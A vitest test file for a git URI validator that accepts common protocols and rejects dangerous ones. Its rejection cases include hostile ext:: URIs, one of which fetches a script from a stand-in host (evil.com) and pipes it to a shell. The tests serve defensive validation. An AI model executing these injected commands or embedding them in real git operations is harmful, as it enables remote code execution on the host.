import { describe, it, expect } from 'vitest';
import { validateGitUri } from '../src/cron/git-sync.js';

describe('validateGitUri', () => {
  describe('allowed protocols', () => {
    const validUris = [
      'https://github.com/org/repo.git',
      'http://github.com/org/repo.git',
      'ssh://git@github.com/org/repo.git',
      'git://github.com/org/repo.git',
      'file:///home/user/repo.git',
      'git@github.com:org/repo.git',
      'deploy@example.com:repos/myrepo.git',
      'HTTPS://GITHUB.COM/org/repo.git',
    ];

    for (const uri of validUris) {
      it(`accepts: ${uri}`, () => {
        expect(() => validateGitUri(uri)).not.toThrow();
      });
    }
  });

  describe('rejected protocols', () => {
    const dangerousUris = [
      'ext::sh -c whoami% >/tmp/pwned',
      'ext::sh -c curl http://evil.com/shell.sh | sh',
      'ext::some-command',
    ];

    for (const uri of dangerousUris) {
      it(`rejects ext:: protocol: ${uri}`, () => {
        expect(() => validateGitUri(uri)).toThrow(/disallowed protocol/);
      });
    }

    it('rejects unknown protocols', () => {
      expect(() => validateGitUri('ftp://example.com/repo.git')).toThrow(/disallowed protocol/);
    });

    it('rejects bare paths without file:// scheme', () => {
      expect(() => validateGitUri('/tmp/repo')).toThrow(/disallowed protocol/);
    });
  });

  it('rejects empty URI', () => {
    expect(() => validateGitUri('')).toThrow(/must not be empty/);
  });

  it('rejects whitespace-only URI', () => {
    expect(() => validateGitUri('   ')).toThrow(/must not be empty/);
  });

  it('trims whitespace before validation', () => {
    expect(() => validateGitUri('  https://github.com/repo.git  ')).not.toThrow();
  });
});
